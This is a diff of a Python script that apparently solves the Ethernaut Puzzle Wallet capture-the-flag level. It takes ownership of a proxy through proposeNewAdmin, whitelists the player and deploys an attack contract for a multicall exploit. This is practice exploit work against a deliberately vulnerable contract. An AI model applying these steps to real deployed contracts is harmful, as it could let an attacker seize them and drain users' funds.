@@ -62,14 +62,23 @@ def main():
     print_storage(player, target)
     
     # player becomes the owner
+    print(f"\nTaking ownership of PuzzleProxy\n")
     target.proposeNewAdmin(player, {"from": player})   
     print_storage(player, target)
      
     # add player to the whitelist  
+    print(f"\nAdding player address to the whitelist\n")
     target.addToWhitelist(player, {"from": player})
     print_storage(player, target)
 
-    # Perform the multicall attack in Solidity  <-- LOOK
+
+# perform the multicall attack in Solidity 
+# via Attack24.sol
+
+
+    # deploy attack contract
+    attack = Attack24.deploy(ETHERNAUT_INSTANCE, {"from": player})
+
 
 
 """
